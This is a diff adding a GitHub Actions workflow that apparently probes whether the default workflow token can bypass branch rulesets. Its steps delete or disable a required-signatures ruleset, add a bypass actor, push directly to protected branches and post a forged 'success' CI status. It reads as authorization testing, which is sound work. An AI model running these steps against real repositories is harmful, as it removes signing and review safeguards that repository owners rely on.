@@ -1,0 +1,54 @@
+name: rs-probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: token-identity-and-ruleset-authz
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          A="https://api.github.com"
+          echo "=== token permissions echoed by the API ==="
+          curl -s -D- -o /dev/null -H "Authorization: Bearer $GH_TOKEN" "$A/repos/$REPO" | grep -i 'x-accepted-github-permissions\|x-oauth-scopes\|x-ratelimit-limit'
+          echo "=== R1 list rulesets with contents:write only ==="
+          curl -s -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $GH_TOKEN" "$A/repos/$REPO/rulesets" | tail -5
+          echo "=== R2 DELETE ruleset rs-sig (19815725) with contents:write only ==="
+          curl -s -w '\nHTTP %{http_code}\n' -X DELETE -H "Authorization: Bearer $GH_TOKEN" "$A/repos/$REPO/rulesets/19815725" | tail -5
+          echo "=== R3 PUT weaken ruleset rs-sig to enforcement=disabled ==="
+          curl -s -w '\nHTTP %{http_code}\n' -X PUT -H "Authorization: Bearer $GH_TOKEN" -H 'Content-Type: application/json' \
+            -d '{"name":"rs-sig","target":"branch","enforcement":"disabled","bypass_actors":[],"conditions":{"ref_name":{"include":["refs/heads/sig"],"exclude":[]}},"rules":[{"type":"required_signatures"}]}' \
+            "$A/repos/$REPO/rulesets/19815725" | tail -5
+          echo "=== R4 add self as bypass actor ==="
+          curl -s -w '\nHTTP %{http_code}\n' -X PUT -H "Authorization: Bearer $GH_TOKEN" -H 'Content-Type: application/json' \
+            -d '{"name":"rs-sig","target":"branch","enforcement":"active","bypass_actors":[{"actor_id":5,"actor_type":"RepositoryRole","bypass_mode":"always"}],"conditions":{"ref_name":{"include":["refs/heads/sig"],"exclude":[]}},"rules":[{"type":"required_signatures"}]}' \
+            "$A/repos/$REPO/rulesets/19815725" | tail -5
+      - name: github-token-direct-push-to-protected
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          git config user.email "actions@github.com"
+          git config user.name "gh-actions"
+          echo "GITHUB_TOKEN-ACTOR-MARKER $(date -u +%s)" > gtmarker.txt
+          git add gtmarker.txt
+          git commit -m "push as GITHUB_TOKEN app actor"
+          echo "=== P1 push to sig (required_signatures) ==="
+          git push origin HEAD:refs/heads/sig 2>&1 | tail -12 || true
+          echo "=== P2 push to pr (pull_request) ==="
+          git push origin HEAD:refs/heads/pr 2>&1 | tail -12 || true
+          echo "=== P3 push to chk2 (app-bound status) ==="
+          git push origin HEAD:refs/heads/chk2 2>&1 | tail -12 || true
+          echo "=== P4 forge status as the GitHub Actions app itself (integration 15368) ==="
+          SHA=$(git rev-parse HEAD)
+          curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: Bearer $GH_TOKEN" -H 'Content-Type: application/json' \
+            -d '{"state":"success","context":"ci/gate","description":"set by GITHUB_TOKEN"}' \
+            "https://api.github.com/repos/${{ github.repository }}/statuses/$SHA" | tail -6
+          echo "=== P5 push to chk2 after app-set status ==="
+          git push origin HEAD:refs/heads/chk2 2>&1 | tail -12 || true
